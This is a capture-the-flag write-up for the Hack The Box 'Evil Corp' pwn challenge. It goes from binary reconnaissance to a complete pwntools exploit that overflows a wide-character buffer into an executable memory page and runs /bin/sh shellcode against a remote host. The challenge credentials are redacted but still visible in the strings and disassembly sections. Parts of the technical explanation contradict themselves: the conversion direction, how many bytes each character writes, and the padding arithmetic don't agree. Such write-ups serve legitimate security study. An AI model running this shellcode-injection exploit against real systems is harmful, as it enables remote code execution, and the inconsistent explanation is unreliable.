![Congrats](assets/screenshots/Evil%20Corp/evil%20corp%20congrats.png)

# Evil Corp - HTB Challenge Writeup
**Room Link:** [Evil Corp](https://app.hackthebox.com/challenges/evil-corp)

> **Challenge Scenario:** We turned our assembly tester off because a big mistake from our new C developer. Do you think there are other mistakes he made?

**Category:** Pwn  
**Points:** 390  

## Environment Setup

### Step 1: Connect to HTB VPN
First, download the `.ovpn` file from Hack The Box and connect:
```bash
sudo openvpn starting_points_eu-starting-point-2-dhcp.ovpn
```
Wait for "Initialization Sequence Completed" message. You should get an IP like `10.10.15.41`.

### Step 2: Verify Connection
```bash
ip a | grep tun0
```
Output should show something like: `inet 10.10.15.41/23 scope global tun0`

### Step 3: Download Challenge Files
```bash
mkdir ~/htb/evil-corp
cd ~/htb/evil-corp
wget https://labs.hackthebox.com/storage/challenges/a12c738a-da2d-412b-83af-f92717631e43.zip
unzip -P hackthebox a12c738a-da2d-412b-83af-f92717631e43.zip
cd pwn_evil_corp/
```

### Step 4: Install Required Tools
```bash
sudo apt update
sudo apt install file binutils gdb ltrace python3-pwntools
```

## Initial Reconnaissance

### Step 5: Basic Binary Information
```bash
file evil-corp
```
Output:
```text
evil-corp: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

```bash
checksec evil-corp
```
Output:
```text
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX enabled    PIE enabled
```
**Findings:**
- No stack canary → Buffer overflow possible
- NX enabled → Can't execute shellcode on stack
- PIE enabled → Binary addresses randomized, but we have fixed mmap addresses

### Step 6: String Analysis
```bash
strings evil-corp | head -30
```
Output includes: `SupportMsg`, `AssemblyTestPage`, `LOGGED_IN`, `ContactSupport`, `eliot`, `4007`

**Found credentials:** `[REDACTED]` / `[REDACTED]`

### Step 7: Test the Binary Locally
```bash
./evil-corp
```
After login with `[REDACTED]/[REDACTED]`, you'll see a menu with options:
1. Assembly Tester
2. Contact Support
3. Logout

## Binary Analysis

### Step 8: Analyze Setup Function
```bash
objdump -d evil-corp | grep -A 50 "<Setup>"
```
Key decompiled code:
```c
void *Setup()
{
  setlocale(6, "en_US.UTF-8");
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  SupportMsg = mmap((void *)0x10000, 0x4B0uLL, 3, 16434, -1, 0LL);
  AssemblyTestPage = mmap((void *)0x11000, 0x800uLL, 7, 16434, -1, 0LL);
  return AssemblyTestPage;
}
```
**Critical Finding:** The `mmap` calls use FIXED addresses (`0x10000` and `0x11000`), bypassing PIE/ASLR for these regions.

### Step 9: Analyze ContactSupport Function
```bash
objdump -d evil-corp | grep -A 80 "<ContactSupport>"
```
Decompiled code:
```c
int ContactSupport()
{
  unsigned int v1[4002];
  wprintf(L"Please describe your issue...");
  fgetws((wchar_t *)v1, 4096, stdin);
  wcharToChar16(v1, SupportMsg, 0x1000uLL);
  return wprintf(L"Thank you!");
}
```

### Step 10: Login Function Analysis
From disassembly at `0x1678` and `0x168b`:
```c
wcscmp(user_input, L"eliot")
wcscmp(pass_input, L"4007")
```
**Credentials:** `[REDACTED]` / `[REDACTED]`

## Understanding the Vulnerability

### Step 11: The Overflow Explained
```text
Buffer size:      v1[4002] = 4002 * 4 = 16,008 bytes
fgetws reads:     4,096 * 2 = 8,192 bytes (no overflow)

wcharToChar16 conversion:
Input:  4,096 wide chars (16-bit) = 8,192 bytes
Output: 4,096 wide chars (32-bit) = 16,384 bytes

SupportMsg size: 0x4B0 = 1,200 bytes
```
The UTF-16 to UTF-32 conversion expands the data from 8,192 bytes to 16,384 bytes, overflowing the 1,200-byte `SupportMsg` buffer into `AssemblyTestPage` at `0x11000`.

### Step 12: Memory Layout
```text
Address     | Region              | Size    | Permissions
------------+---------------------+---------+-------------
0x10000     | SupportMsg          | 1,200   | RW-
0x10500     | (padding)           | ~2,800  | -
0x11000     | AssemblyTestPage    | 2,048   | RWX
```

### Step 13: The Unicode Conversion Trick
The `wcharToChar16` function takes UTF-16 input and converts it to UTF-32. This means:
```text
To write bytes:     \x48\x31\xc0
Send as UTF-32:     U"\U00003148"
```
Each 4-byte UTF-32 character writes 4 bytes of shellcode to memory.

## Exploit Development

### Step 14: Shellcode Preparation
Shellcode values (x64 execve /bin/sh):
```python
shellcode_vals = [
    0x00003148, 0x000048d2, 0x00002fbb, 0x0000622f,
    0x00006e69, 0x0000732f, 0x00004868, 0x0000ebc1,
    0x00005308, 0x00008948, 0x000050e7, 0x00004857,
    0x0000e689, 0x00003bb0, 0x00003148, 0x00000ff6,
    0x00000005
]
```

### Step 15: Payload Construction
Payload structure:
1. `\U00001111` × 2048 → Fills 4096 bytes to reach `AssemblyTestPage`
2. Shellcode in UTF-32 format
3. Null bytes for alignment
4. Return address `\U00011000` pointing to shellcode

## Getting the Flag

### Step 16: Run Final Exploit
```bash
python3 exploit.py
```
Output:
```text
[+] Connecting to 154.57.164.77:31198
[+] Login successful
[+] Sending payload (4004 chars)
[+] Exploit sent! Getting shell...
$
```

### Step 17: Read the Flag
```bash
$ ls -la
total 28
-rw-r--r--. 1 root root    37 Jun 11 13:55 flag.txt
-rwxr-xr-x. 1 root root 21592 Jan 26  2024 evil-corp

$ cat flag.txt
```
**Flag:**
![Flag](assets/screenshots/Evil%20Corp/evil%20corp%20flag.png)

## Full Exploit Code (`exploit.py`)
```python
#!/usr/bin/env python3
from pwn import *

HOST = "154.57.164.77"
PORT = 31198

shellcode_vals = [
    0x00003148, 0x000048d2, 0x00002fbb, 0x0000622f,
    0x00006e69, 0x0000732f, 0x00004868, 0x0000ebc1,
    0x00005308, 0x00008948, 0x000050e7, 0x00004857,
    0x0000e689, 0x00003bb0, 0x00003148, 0x00000ff6,
    0x00000005
]

def exploit():
    print(f"[+] Connecting to {HOST}:{PORT}")
    p = remote(HOST, PORT)
    
    p.recvuntil(b'Username:')
    p.sendline(b'[REDACTED]')
    
    p.recvuntil(b'Password:')
    p.sendline(b'[REDACTED]')
    
    p.recvuntil(b'Choice:')
    print("[+] Login successful")
    p.sendline(b'2')
    
    padding1 = '\U00001111' * 2048
    shellcode = ''.join(chr(v) for v in shellcode_vals)
    padding2 = '\x00' * (1954 - len(shellcode))
    ret_addr = '\U00011000'
    
    payload = padding1 + shellcode + padding2 + ret_addr + '\x00'
    
    print(f"[+] Sending payload ({len(payload)} chars)")
    p.sendline(payload)
    
    print("[+] Exploit sent! Getting shell...")
    p.interactive()

if __name__ == "__main__":
    exploit()
```

## Tools Used
- Ghidra / IDA Pro
- GDB / Pwndbg
- Python (pwntools)
- Netcat

## Key Takeaways
- **Unicode conversion vulnerabilities:** Converting between UTF-16 and UTF-32 expands data size, creating buffer overflows.
- **Fixed mmap addresses bypass PIE:** `mmap` with fixed addresses gives predictable memory locations even with PIE enabled.
- **Data type confusion:** Mixing `wchar_t` sizes (2 bytes vs 4 bytes) creates dangerous vulnerabilities.
- **Core dump analysis:** Core dumps can reveal working exploit payloads.
